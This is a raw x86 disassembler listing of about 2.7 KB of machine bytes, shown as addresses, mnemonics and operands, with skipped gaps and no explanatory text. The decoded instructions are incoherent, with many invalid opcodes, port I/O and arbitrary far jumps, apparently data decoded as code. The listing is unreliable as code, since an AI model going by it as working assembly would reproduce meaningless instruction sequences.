  426b65:	sub    BYTE PTR [ebx+0x63],bh
  426b68:	add    BYTE PTR [ecx],dh
  426b6a:	retf   
  426b6b:	pop    eax
  426b6c:	rcr    BYTE PTR [eax],0xac
  426b6f:	mov    bl,0xb
  426b71:	repz dec esi
  426b73:	scas   eax,DWORD PTR es:[edi]
  426b74:	rcl    BYTE PTR [edi],cl
  426b76:	(bad)  
  426b77:	in     eax,dx
  426b78:	hlt    
  426b79:	cmp    eax,0xf7ab4c93
  426b7e:	mov    bh,0xff
  426b80:	push   ebx
  426b81:	cmp    edi,ebx
  426b83:	pop    ebx
  426b84:	out    0x1f,eax
  426b86:	int3   
  426b87:	adc    al,0x33
  426b89:	jnp    0x426bf5
  426b8b:	(bad)  
  426b8c:	jo     0x426b19
  426b8e:	ds jno 0x426bbd
  426b91:	test   esp,esi
  426b93:	daa    
  426b94:	mov    al,ds:0x58b5d00e
  426b99:	test   BYTE PTR [eax-0x49],dl
  426b9c:	cdq    
  426b9d:	and    eax,eax
  426b9f:	fstp   TBYTE PTR [ebp+0x14]
  426ba2:	popa   
  426ba3:	jg     0x426c06
  426ba5:	mov    ds:0xec9ae073,eax
  426baa:	pop    edx
  426bab:	lea    edx,[eax-0x6213e020]
  426bb1:	test   BYTE PTR [edi],dh
  426bb3:	jb     0x426c29
  426bb5:	xchg   edi,eax
  426bb6:	mov    gs,WORD PTR [eax+0x7b8410af]
  426bbc:	pop    ss
  426bbd:	es ret 0x7568
  426bc1:	push   ds
  426bc2:	mov    ebx,cs
  426bc4:	dec    ebx
  426bc5:	rcl    DWORD PTR [ecx+0x68],0xc1
  426bc9:	mov    eax,ds:0x78a1a2f8
  426bce:	outs   dx,DWORD PTR ds:[esi]
  426bcf:	in     al,0x78
  426bd1:	test   eax,0x1cce7953
  426bd6:	test   BYTE PTR [esi-0x2be11c49],0xb7
  426bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bde:	shl    DWORD PTR [esi],cl
  426be0:	sbb    ah,bh
  426be2:	fist   WORD PTR [ecx+0x67]
  426be5:	outs   dx,BYTE PTR ds:[esi]
  426be6:	add    ecx,DWORD PTR [eax-0x12]
  426be9:	fidiv  WORD PTR [esi]
  426beb:	aam    0xfb
  426bed:	leave  
  426bee:	inc    ecx
  426bef:	fild   WORD PTR [edi-0x38a17fcd]
  426bf5:	pop    esi
  426bf6:	mov    bl,0xf9
  426bf8:	lods   eax,DWORD PTR ds:[esi]
  426bf9:	inc    BYTE PTR [edi-0x27ab2e43]
  426bff:	mov    DWORD PTR [ebx-0x562fc42b],ebx
  426c05:	ins    DWORD PTR es:[edi],dx
  426c06:	jmp    0x10f2bea5
  426c0b:	stc    
  426c0c:	pcmpgtd mm6,QWORD PTR ds:0x4c
	...
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xbffd3ad2
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	or     dh,BYTE PTR [ebp+0x4d]
  426c8f:	push   ebp
  426c90:	push   ds
  426c91:	ret    0x1c2b
  426c94:	pop    ecx
  426c95:	mov    dh,0xe6
  426c97:	mov    es,WORD PTR [edx-0xf]
  426c9a:	pop    es
  426c9b:	(bad)  
  426c9c:	cmp    ah,BYTE PTR [edi]
  426c9e:	std    
  426c9f:	aad    0x47
  426ca1:	inc    ebp
  426ca2:	cwde   
  426ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ca4:	sub    al,0x29
  426ca6:	inc    ebp
  426ca7:	ds enter 0xd22d,0x77
  426cac:	fsubr  QWORD PTR [ecx]
  426cae:	stc    
  426caf:	mov    ds:0x2cc3c11d,al
  426cb4:	pmulhuw mm5,mm7
  426cb7:	fisubr DWORD PTR [esi+0x5c5ae293]
  426cbd:	push   es
  426cbe:	push   eax
  426cbf:	mov    cl,0xf
  426cc1:	mov    ah,0xea
  426cc3:	js     0x426c89
  426cc5:	sar    DWORD PTR [ecx-0x2e96c730],1
  426ccb:	xchg   edi,eax
  426ccc:	test   ebp,esp
  426cce:	or     eax,0x162172cc
  426cd3:	xor    eax,0x78e354
  426cd8:	je     0x426cf5
  426cda:	sub    bh,BYTE PTR [ebx-0x143ed014]
  426ce0:	or     al,0x16
  426ce2:	stc    
  426ce3:	xchg   esp,eax
  426ce4:	add    BYTE PTR ds:0x16f2591e,0xd7
  426ceb:	jmp    0x10f65335
  426cf0:	sbb    DWORD PTR [ecx+ebx*2-0xef5e664],0xa2097483
  426cfb:	inc    esi
  426cfc:	arpl   WORD PTR [eax-0x42],cx
  426cff:	jecxz  0x426c83
  426d01:	cmp    esi,DWORD PTR [edi]
  426d03:	inc    ebp
  426d04:	push   0x2ba6f412
  426d09:	mov    ah,0x6b
  426d0b:	inc    edx
  426d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d0d:	repnz imul edi,DWORD PTR [edx+0x5f],0x62
  426d12:	jae    0x426d34
  426d14:	lea    esp,[ebp+0x51]
  426d17:	mov    bh,BYTE PTR [ebp+0x67]
  426d1a:	call   0x4bf47e5b
  426d1f:	and    esp,ebx
  426d21:	call   0xaa2:0x6d93dfe6
  426d28:	inc    esp
  426d29:	lods   al,BYTE PTR ds:[esi]
  426d2a:	ror    edx,0xb7
  426d2d:	repnz fs pop es
  426d30:	pop    esp
  426d31:	push   ecx
  426d32:	dec    edx
  426d33:	mov    ds:0xea022bbd,al
  426d38:	jle    0x426d94
  426d3a:	mov    bl,0x79
  426d3c:	push   esp
  426d3d:	pop    edx
  426d3e:	ins    BYTE PTR es:[edi],dx
  426d3f:	fdiv   DWORD PTR [ecx+0x5bba0f98]
  426d45:	imul   BYTE PTR [esi]
  426d47:	add    BYTE PTR [eax-0x2ba9f8fd],ch
  426d4d:	in     eax,0x43
  426d4f:	pop    ecx
  426d50:	xor    eax,0xc3f1519
  426d55:	in     al,dx
  426d56:	(bad)  
  426d57:	sar    esp,cl
  426d59:	push   ebx
  426d5a:	pop    ecx
  426d5b:	popa   
  426d5c:	ds ins DWORD PTR es:[edi],dx
  426d5e:	in     eax,0x2
  426d60:	mov    esi,0x3f059e00
  426d65:	or     edx,DWORD PTR [edx]
  426d67:	fmulp  st(3),st
  426d69:	mov    ch,0x9f
  426d6b:	and    DWORD PTR [esi+0x789dd45d],esi
  426d71:	jo     0x426ddd
  426d73:	neg    BYTE PTR [esi-0x23]
  426d76:	ss retf 
  426d78:	mov    al,0xc2
  426d7a:	loope  0x426d1d
  426d7c:	inc    eax
  426d7d:	std    
  426d7e:	adc    BYTE PTR [eax],al
  426d80:	mov    ecx,0xcdb2b5c2
  426d85:	inc    edx
  426d86:	(bad)  
  426d87:	pop    edi
  426d88:	gs popa 
  426d8a:	adc    DWORD PTR [ecx-0x343f46a],edx
	...
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0xda0c:0xc7c2ecf9
  426e01:	aas    
  426e02:	lods   al,BYTE PTR ds:[esi]
  426e03:	je     0x426e09
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	lods   eax,DWORD PTR ds:[esi]
  426e0d:	xor    DWORD PTR [ecx+0x53],ebx
  426e10:	push   0xa0618fcc
  426e15:	xor    eax,0xf0a0cfd5
  426e1a:	nop
  426e1b:	mov    al,ds:0x8df65c5b
  426e20:	jns    0x426e83
  426e22:	mov    cs,dx
  426e25:	sahf   
  426e26:	add    ah,BYTE PTR [eax-0x60f1555c]
  426e2c:	lock cmp dl,BYTE PTR [edi+eax*4+0x5824fd74]
  426e34:	popa   
  426e35:	mov    ch,0xb8
  426e37:	aam    0xf5
  426e39:	nop
  426e3a:	pusha  
  426e3b:	jb     0x426e7c
  426e3d:	mov    cs:0xece9f9d5,al
  426e43:	js     0x426e7b
  426e45:	sbb    dh,BYTE PTR [edx-0x7c]
  426e48:	jmp    0x441c:0xe825ea7d
  426e4f:	mov    esp,0xd4d5b3f1
  426e54:	leave  
  426e55:	cmp    al,BYTE PTR [edx+0x4361d16]
  426e5b:	sbb    DWORD PTR [ecx+0x7e],ecx
  426e5e:	pop    ebx
  426e5f:	stos   DWORD PTR es:[edi],eax
  426e60:	(bad)  
  426e61:	call   0xff22807f
  426e66:	jge    0x426ebb
  426e68:	lods   eax,DWORD PTR ds:[esi]
  426e69:	rcl    eax,1
  426e6b:	xchg   ecx,eax
  426e6c:	test   BYTE PTR [eax+0x3e8a8222],bh
  426e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e73:	cmp    cl,BYTE PTR [ebp+0x327167d0]
  426e79:	sbb    DWORD PTR [esi-0x44cb019f],0x3b
  426e80:	ins    DWORD PTR es:[edi],dx
  426e81:	ret    
  426e82:	shr    ch,0x9b
  426e85:	sub    ecx,DWORD PTR [eax]
  426e87:	bnd call 0xce8a17
  426e8d:	dec    esp
  426e8e:	mov    ecx,0xe4cbcd38
  426e93:	lods   al,BYTE PTR ds:[esi]
  426e94:	pop    esp
  426e95:	cmp    bh,dh
  426e97:	jmp    0x426eaf
  426e99:	fsub   DWORD PTR [ebp-0x6c6a97c3]
  426e9f:	mov    esi,0x639dccbe
  426ea4:	mov    BYTE PTR [ecx+0x3a],ch
  426ea7:	pushf  
  426ea8:	inc    edx
  426ea9:	(bad)  
  426eaa:	dec    ebx
  426eab:	(bad)  
  426eac:	sub    DWORD PTR [edx],edi
  426eae:	xchg   edi,eax
  426eaf:	popf   
  426eb0:	div    DWORD PTR [edi+0x3060e480]
  426eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426eb7:	outs   dx,DWORD PTR ds:[esi]
  426eb8:	sti    
  426eb9:	loopne 0x426f38
  426ebb:	or     BYTE PTR [ebp-0x4d],0x4e
  426ebf:	je     0x426ea5
  426ec1:	fcomp  QWORD PTR [ebp-0x4f029e78]
  426ec7:	xchg   edx,eax
  426ec8:	push   edx
  426ec9:	jb     0x426eb0
  426ecb:	sbb    edx,ebx
  426ecd:	hlt    
  426ece:	sub    al,0x6c
  426ed0:	mov    bl,0x70
  426ed2:	fild   DWORD PTR [ecx+ecx*2]
  426ed5:	int3   
  426ed6:	pop    esi
  426ed7:	call   FWORD PTR ds:0xc34120d4
  426edd:	in     eax,dx
  426ede:	in     al,0x86
  426ee0:	add    al,0xb8
  426ee2:	(bad)  
  426ee4:	mov    cl,0xb7
  426ee6:	div    DWORD PTR [ebp-0x42]
  426ee9:	scas   al,BYTE PTR es:[edi]
  426eea:	jo     0x426f29
  426eec:	int    0x8c
  426eee:	sti    
  426eef:	push   esi
  426ef0:	xchg   BYTE PTR [edx-0x5c],ah
  426ef3:	mov    bl,0x49
  426ef5:	imul   ecx,DWORD PTR [ebx],0xffffffd7
  426ef8:	or     al,BYTE PTR [edx-0x7bde0779]
  426efe:	mov    WORD PTR [eax+0x58bdbc3c],es
  426f04:	int3   
  426f05:	pop    ebx
  426f06:	lock shl ebx,0x73
  426f0a:	mov    bh,bl
  426f0c:	loop   0x426f46
  426f0e:	xchg   ebp,eax
  426f0f:	stos   DWORD PTR es:[edi],eax
	...
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [eax+edx*2+0x839eb0e],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	jo     0x426ffe
  426f8e:	sub    dh,al
  426f90:	in     al,0x59
  426f92:	fdivr  QWORD PTR [ecx+eax*8]
  426f95:	das    
  426f96:	xchg   DWORD PTR [ebx-0x6e],edx
  426f99:	dec    ebx
  426f9a:	fbstp  TBYTE PTR [edi*4-0x4950d926]
  426fa1:	sbb    DWORD PTR [eax+0x36],ebp
  426fa4:	rcr    esp,1
  426fa6:	jge    0x426f61
  426fa8:	stos   BYTE PTR es:[edi],al
  426fa9:	sbb    al,0x4a
  426fab:	sar    cl,1
  426fad:	bound  esp,QWORD PTR [edx-0x4e]
  426fb0:	fstp   TBYTE PTR [edx+0x6b5ca702]
  426fb6:	hlt    
  426fb7:	xchg   edx,eax
  426fb8:	ins    BYTE PTR es:[edi],dx
  426fb9:	data16 js 0x426f40
  426fbc:	pop    edx
  426fbd:	xor    eax,0x3c6d2a2a
  426fc2:	outs   dx,DWORD PTR ds:[esi]
  426fc3:	sbb    BYTE PTR ds:0x1f5ddf60,dh
  426fc9:	ret    
  426fca:	xchg   esi,eax
  426fcb:	div    esp
  426fcd:	mov    bh,0xa
  426fcf:	outs   dx,BYTE PTR ds:[esi]
  426fd0:	push   eax
  426fd1:	es test ebp,ebp
  426fd4:	push   0x908680fd
  426fd9:	pop    es
  426fda:	rcr    bh,0xc2
  426fdd:	fstp   QWORD PTR [eax+0x64dade08]
  426fe3:	cmp    bl,cl
  426fe5:	inc    edi
  426fe6:	iret   
  426fe7:	dec    esi
  426fe8:	jo     0x426fc6
  426fea:	(bad)  [ebx]
  426fec:	fistp  WORD PTR [ebx-0x3f4c3ff2]
  426ff2:	imul   eax,ebp,0xe7fa48ba
  426ff8:	pop    ebx
  426ff9:	shl    BYTE PTR [edi-0xc800d0d],cl
  426fff:	retf   
  427000:	pop    edx
  427001:	push   ebp
  427002:	pop    ebx
  427003:	sbb    al,0x2f
  427005:	ins    DWORD PTR es:[edi],dx
  427006:	inc    edx
  427007:	jno    0x427084
  427009:	sbb    DWORD PTR [edx],ecx
  42700b:	sbb    al,0x9d
  42700d:	inc    ebp
  42700e:	or     al,0xdb
  427010:	lock cwde 
  427012:	inc    ebp
  427013:	jmp    0x6cb5e56f
  427018:	loope  0x426fa6
  42701a:	pop    ebx
  42701b:	xchg   ebp,eax
  42701c:	ss xor eax,esi
  42701f:	enter  0x6756,0x13
  427023:	lds    ecx,FWORD PTR ds:0xecb551bf
  427029:	dec    edx
  42702a:	jg     0x426fd2
  42702c:	stos   BYTE PTR es:[edi],al
  42702d:	popa   
  42702e:	pop    eax
  42702f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427030:	(bad)  
  427031:	bound  eax,QWORD PTR [esi+0x51]
  427034:	jb     0x4270af
  427036:	cli    
  427037:	cdq    
  427038:	push   cs
  427039:	test   al,0xec
  42703b:	ret    
  42703c:	xchg   ebx,eax
  42703d:	push   0x11
  42703f:	mov    cl,0x42
  427041:	xchg   ebp,eax
  427042:	cdq    
  427043:	inc    ebx
  427044:	inc    edi
  427045:	add    BYTE PTR [edx-0x16],bl
  427048:	popa   
  427049:	pop    edi
  42704a:	repnz test al,bl
  42704d:	cmp    al,0xe0
  42704f:	and    ecx,edi
  427051:	sub    al,0x13
  427053:	fstp   TBYTE PTR [edx+ebx*8-0x51b56848]
  42705a:	xchg   ebx,eax
  42705b:	mov    esi,0x1ef87f9b
  427060:	iret   
  427061:	sub    DWORD PTR [ecx-0x62],ecx
  427064:	in     al,dx
  427065:	test   al,0x5f
  427067:	call   0x2037:0x5a2ea0a
  42706e:	fdiv   QWORD PTR [esi+0x33]
  427071:	mov    bh,0xf3
  427073:	ror    BYTE PTR ds:0x41b38286,0x91
  42707a:	xchg   esi,eax
  42707b:	pop    es
  42707c:	mov    ch,0x3c
  42707e:	fistp  DWORD PTR ds:0xd2ceeeb3
  427084:	std    
  427085:	retf   0xa5ae
  427088:	inc    edx
  427089:	add    bl,0x53
  42708c:	mov    bl,0x75
  42708e:	bound  ebx,QWORD PTR [edi]
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xb4b09d96
  427102:	xchg   ebp,eax
  427103:	mov    ebp,0x1a10c
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	push   edx
  42710d:	mov    ch,0x61
  42710f:	inc    edx
  427110:	leave  
  427111:	inc    ecx
  427112:	or     DWORD PTR [edi-0xcf3d2c2],edi
  427118:	aam    0x63
  42711a:	int3   
  42711b:	out    0x64,eax
  42711d:	mov    ebx,0xb99aaf09
  427122:	out    0x87,al
  427124:	outs   dx,BYTE PTR ds:[esi]
  427125:	sar    DWORD PTR [esi-0x10],1
  427128:	dec    ebx
  427129:	dec    edx
  42712a:	cmp    DWORD PTR [edi-0x2],edx
  42712d:	int    0xea
  42712f:	inc    eax
  427130:	lea    esi,[edx+0x6a]
  427133:	cwde   
  427134:	cmp    al,0x5a
  427136:	aaa    
  427137:	sub    al,0x43
  427139:	aad    0x61
  42713b:	xchg   ebp,eax
  42713c:	inc    ebx
  42713d:	(bad)  
  42713e:	in     al,dx
  42713f:	enter  0x7a50,0x71
  427143:	lahf   
  427144:	or     bh,BYTE PTR [esi-0x15d72f9a]
  42714a:	test   BYTE PTR gs:[ebx-0x2d],dl
  42714e:	mov    ebp,0x10a110d
  427153:	pop    ebx
  427154:	xor    eax,0xa4d01cdd
  427159:	int    0x1
  42715b:	addr16 inc eax
  42715d:	je     0x42710f
  42715f:	sbb    edi,DWORD PTR [esi+0x7622f425]
  427165:	mov    al,0x4d
  427167:	sti    
  427168:	jg     0x427163
  42716a:	inc    ecx
  42716b:	xchg   DWORD PTR [esi],eax
  42716d:	sub    eax,0x2849dd02
  427172:	xchg   edx,eax
  427173:	imul   edi,edi,0xc319bfde
  427179:	jns    0x42716c
  42717b:	(bad)  
  42717c:	fld    TBYTE PTR [ecx+0x2a]
  427180:	aaa    
  427181:	arpl   cx,bx
  427183:	mov    WORD PTR [eax-0x1bdf0d1f],es
  427189:	sahf   
  42718a:	icebp  
  42718b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42718c:	mov    edx,0x383c3c5a
  427191:	sbb    BYTE PTR [eax],ah
  427193:	xchg   ah,dl
  427195:	in     eax,dx
  427196:	data16 sahf 
  427198:	int    0x6a
  42719a:	jmp    0x43f1be44
  42719f:	mov    gs,WORD PTR [ebx+0x2d5be12c]
  4271a5:	push   cs
  4271a6:	inc    eax
  4271a7:	mov    dl,0x78
  4271a9:	pushf  
  4271aa:	xchg   esp,eax
  4271ab:	inc    eax
  4271ac:	inc    edi
  4271ad:	cld    
  4271ae:	fstp   QWORD PTR [esi+eax*1-0x4c69f6af]
  4271b5:	iret   
  4271b6:	stos   DWORD PTR es:[edi],eax
  4271b7:	and    ax,0xe638
  4271bb:	data16 xor al,BYTE PTR [eax+0x34]
  4271bf:	xor    eax,ebx
  4271c1:	in     al,0x99
  4271c3:	imul   BYTE PTR [ebp-0x2719432c]
  4271c9:	mov    ebx,0x7fa0354c
  4271ce:	sar    BYTE PTR [edx+0x487903bb],0xc1
  4271d5:	cmp    al,BYTE PTR [esi-0x64826dd3]
  4271db:	dec    ecx
  4271dc:	cdq    
  4271dd:	cmp    edx,esi
  4271df:	jmp    0x1912:0x1078f77d
  4271e6:	js     0x4271f7
  4271e8:	or     eax,0xb3f1f76
  4271ed:	fs push 0x73
  4271f0:	sub    BYTE PTR [edx],bh
  4271f2:	(bad)  
  4271f3:	dec    esp
  4271f4:	sahf   
  4271f5:	mov    ebx,0xa9034840
  4271fa:	xchg   esp,eax
  4271fb:	(bad)  
  4271fc:	push   0xffffffa0
  4271fe:	sbb    BYTE PTR [esi+esi*1+0x5c],0xb4
  427203:	add    al,0xba
  427205:	xchg   ebx,eax
  427206:	push   edi
  427207:	(bad)
  42720a:	inc    esi
  42720b:	scas   al,BYTE PTR es:[edi]
  42720c:	cmp    eax,0xbde0ad
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xbd0b9cb2,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	mov    esp,0xe1a089e0
  427291:	jmp    0x7d8495ae
  427296:	call   0x72a58c0a
  42729b:	jp     0x4272ca
  42729d:	sub    BYTE PTR [edx+edx*1-0xf],ah
  4272a1:	or     eax,0x7efb86b4
  4272a6:	and    al,0xcd
  4272a8:	dec    esi
  4272a9:	jecxz  0x427309
  4272ab:	mov    ecx,0x37321a1a
  4272b0:	out    dx,eax
  4272b1:	xchg   ecx,eax
  4272b2:	jmp    0x427276
  4272b4:	outs   dx,DWORD PTR ds:[esi]
  4272b5:	popa   
  4272b6:	fadd   st,st(6)
  4272b8:	clc    
  4272b9:	jmp    0xb06a:0x377e1820
  4272c0:	pop    esi
  4272c1:	aad    0xac
  4272c3:	sub    BYTE PTR [edx-0x58],dl
  4272c6:	cwde   
  4272c7:	sar    BYTE PTR [ebx],cl
  4272c9:	es in  eax,0x32
  4272cc:	pop    edx
  4272cd:	ins    DWORD PTR es:[edi],dx
  4272ce:	lock leave 
  4272d0:	xchg   ebp,eax
  4272d1:	pop    ds
  4272d2:	std    
  4272d3:	out    dx,al
  4272d4:	fmul   QWORD PTR [edi-0x1e]
  4272d7:	xchg   DWORD PTR [ebp+0x4b],edi
  4272da:	sbb    esi,ebp
  4272dc:	dec    ebp
  4272dd:	inc    DWORD PTR [ecx]
  4272df:	repnz mov ds:0xfd5ea05f,al
  4272e5:	xor    al,0x99
  4272e7:	dec    esi
  4272e8:	rol    DWORD PTR [edx+0x2aaeb910],0x53
  4272ef:	adc    DWORD PTR [ebp+0x54c30175],0xffffffa5
  4272f6:	mov    bh,0x3f
  4272f8:	add    eax,0xb3ee3fe1
  4272fd:	add    BYTE PTR [edi-0x1df2aa58],bl
  427303:	cmp    DWORD PTR [ebx-0x7efed10b],eax
  427309:	mov    esi,0x2892d4e3
  42730e:	mov    edx,0x8cb1406f
  427313:	mov    ah,0x94
  427315:	cmp    edx,DWORD PTR [ecx]
  427317:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  427319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42731a:	int3   
  42731b:	iret   
  42731c:	jl     0x427344
  42731e:	xchg   ecx,eax
  42731f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427320:	add    dh,BYTE PTR [eax]
  427322:	arpl   WORD PTR [esi-0x18c588aa],sp
  427328:	jb     0x4272e1
  42732a:	mov    eax,ds:0xb9735c47
  42732f:	push   cs
  427330:	mov    al,0xcf
  427332:	sub    edx,ebp
  427334:	lahf   
  427335:	std    
  427336:	(bad)  [ebx+0x2b25b216]
  42733c:	and    bl,bh
  42733e:	cmp    BYTE PTR [ecx-0x1b],0xe5
  427342:	call   0x27a3d1c6
  427347:	push   0xdc7e23d4
  42734c:	jecxz  0x4272f4
  42734e:	movntq QWORD PTR [eax-0x25ed20e3],mm7
  427355:	pop    es
  427356:	or     eax,0x8e493c9e
  42735b:	push   edx
  42735c:	pusha  
  42735d:	stc    
  42735e:	in     eax,0x9
  427360:	sti    
  427361:	sub    ch,ah
  427363:	in     al,0xbb
  427365:	sbb    DWORD PTR [ebx-0x6c],ebx
  427368:	xchg   ecx,eax
  427369:	push   ebp
  42736a:	nop
  42736b:	(bad)  
  42736c:	int    0xd
  42736e:	iret   
  42736f:	int    0x21
  427371:	add    eax,0x4084a296
  427376:	inc    edi
  427377:	js     0x4273e2
  427379:	shr    BYTE PTR [ecx+0x43],cl
  42737c:	fidiv  WORD PTR [ebx-0x2c]
  42737f:	push   0x7383f541
  427384:	and    al,0xcc
  427386:	(bad)  
  427388:	add    DWORD PTR [edi+0x55d5bc8a],ebp
  42738e:	sti    
  42738f:	pop    ss
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    edx,DWORD PTR [ebx+0x14864266]
  427405:	mov    ds:0x1040001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	mov    ebx,0x942c5e33
  427411:	pop    ecx
  427412:	hlt    
  427413:	lods   eax,DWORD PTR ds:[esi]
  427414:	pop    esi
  427415:	mov    ebp,0x4e8d3560
  42741a:	xchg   ebx,eax
  42741b:	or     eax,0x65687a3
  427420:	cdq    
  427421:	test   eax,0x2c100c3c
  427426:	xlat   BYTE PTR ds:[ebx]
  427427:	int3   
  427428:	adc    eax,0xbe41293d
  42742d:	dec    ebp
  42742e:	xor    cl,dl
  427430:	jae    0x4273fa
  427432:	mov    al,0xc1
  427434:	xchg   ebx,eax
  427435:	mov    bh,0xd1
  427437:	retf   
  427438:	(bad)  
  427439:	xor    eax,DWORD PTR [ebx+esi*2]
  42743c:	sbb    DWORD PTR [ebx+0x4d8738bc],ecx
  427442:	ficom  WORD PTR [ebp-0x3d5f6f27]
  427448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427449:	in     al,0x7d
  42744b:	out    0x80,eax
  42744d:	das    
  42744e:	aam    0x8
  427450:	mov    esi,0xe75514bb
  427455:	ss mov eax,0x4b3800b3
  42745b:	in     al,dx
  42745c:	jmp    0x13305b52
  427461:	(bad)  
  427462:	sti    
  427463:	imul   edi,DWORD PTR [ebp-0x19],0x72
  427467:	cs pusha 
  427469:	lahf   
  42746a:	adc    ebx,DWORD PTR [ebp-0x1]
  42746d:	xchg   ebp,eax
  42746e:	loop   0x4274a0
  427470:	mov    fs,WORD PTR [ebx]
  427472:	push   0x9381c9ba
  427477:	call   0x6068:0xc94d051e
  42747e:	jmp    0xc695ad7b
  427483:	mov    esi,ds
  427485:	push   cs
  427486:	aaa    
  427487:	test   eax,0x4c94c819
  42748c:	je     0x42742c
  42748e:	(bad)  
  42748f:	(bad)  
  427490:	jb     0x427499
  427492:	vcvtss2sd xmm7,xmm2,DWORD PTR [edx]
  427496:	repz jo 0x427480
  427499:	jg     0x427468
  42749b:	sbb    esp,esp
  42749d:	push   edx
  42749e:	stos   BYTE PTR es:[edi],al
  42749f:	sub    BYTE PTR [ecx+0x43],bh
  4274a2:	in     eax,0xf6
  4274a4:	in     al,0xf5
  4274a6:	das    
  4274a7:	std    
  4274a8:	inc    esp
  4274a9:	es cld 
  4274ab:	sbb    al,0x70
  4274ad:	pop    edx
  4274ae:	cbw    
  4274b0:	int    0xb
  4274b2:	jbe    0x427440
  4274b4:	xchg   DWORD PTR [edi-0x49c1db5d],ebp
  4274ba:	test   al,0x79
  4274bc:	bound  edi,QWORD PTR [ebx-0x4a]
  4274bf:	fidivr WORD PTR [edi]
  4274c1:	sub    esi,eax
  4274c3:	push   es
  4274c4:	stos   DWORD PTR es:[edi],eax
  4274c5:	cmp    esi,DWORD PTR [ecx+0x72]
  4274c8:	(bad)  
  4274c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274ca:	adc    esp,DWORD PTR [esi+0x51]
  4274cd:	out    dx,al
  4274ce:	out    0xe4,al
  4274d0:	loope  0x4274ec
  4274d2:	jp     0x4274fd
  4274d4:	pusha  
  4274d5:	add    DWORD PTR [ebx-0x969474e],0x4a
  4274dc:	pop    ss
  4274dd:	push   ss
  4274de:	push   0x9d8b6e28
  4274e3:	dec    esi
  4274e4:	adc    eax,0xeac1565d
  4274e9:	clc    
  4274ea:	push   eax
  4274eb:	pop    ds
  4274ec:	loopne 0x427472
  4274ee:	add    BYTE PTR [ecx+esi*1+0x64e2abb0],0x87
  4274f6:	test   BYTE PTR [ebp-0x5a],0xae
  4274fa:	(bad)  
  4274fb:	ins    BYTE PTR es:[edi],dx
  4274fc:	push   ecx
  4274fd:	jne    0x42748f
  4274ff:	loope  0x427536
  427501:	fidiv  DWORD PTR [ecx-0x4e]
  427504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427505:	aam    0x3a
  427507:	push   ebx
  427508:	add    al,0x13
  42750a:	aad    0x4a
  42750c:	jp     0x4274fa
  42750e:	out    0xbe,al
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	lods   al,BYTE PTR ds:[esi]
  427581:	fst    QWORD PTR [esi]
  427583:	push   esi
  427584:	sbb    BYTE PTR [ecx+eax*1+0x10400],ah
  42758b:	add    BYTE PTR [edi+0x4e199bbb],al
  427591:	inc    edi
  427592:	pop    ecx
  427593:	ins    BYTE PTR es:[edi],dx
  427594:	clc    
  427595:	jne    0x427564
  427597:	out    0x4d,eax
  427599:	and    bh,BYTE PTR [eax+eax*2-0x2a168049]
  4275a0:	outs   dx,DWORD PTR ds:[esi]
  4275a1:	push   edi
  4275a2:	test   DWORD PTR [edx],0xb335607f
  4275a8:	adc    DWORD PTR [ecx+0x58539897],eax
  4275ae:	mov    ds:0xe36f8d28,al
  4275b3:	or     esp,DWORD PTR [ebx]
  4275b5:	(bad)  
  4275b6:	(bad)  [eax-0x72]
  4275b9:	and    dh,cl
  4275bb:	mov    ds:0xc605ff4e,eax
  4275c0:	cli    
  4275c1:	fwait
  4275c2:	push   ds
  4275c3:	lock adc eax,0xfe6fea91
  4275c9:	and    eax,0x258546e6
  4275ce:	xor    esp,DWORD PTR [ecx]
  4275d0:	and    eax,0x503f51e6
  4275d5:	sahf   
  4275d6:	shr    DWORD PTR [edx+0x15],0x12
  4275da:	cmp    edi,DWORD PTR [eax]
  4275dc:	fcomp  st(5)
  4275de:	mov    bh,al
  4275e0:	rcl    BYTE PTR [esi-0x70],cl
  4275e3:	xor    dh,dl
  4275e5:	mov    WORD PTR [eax+eax*2+0x72],ds
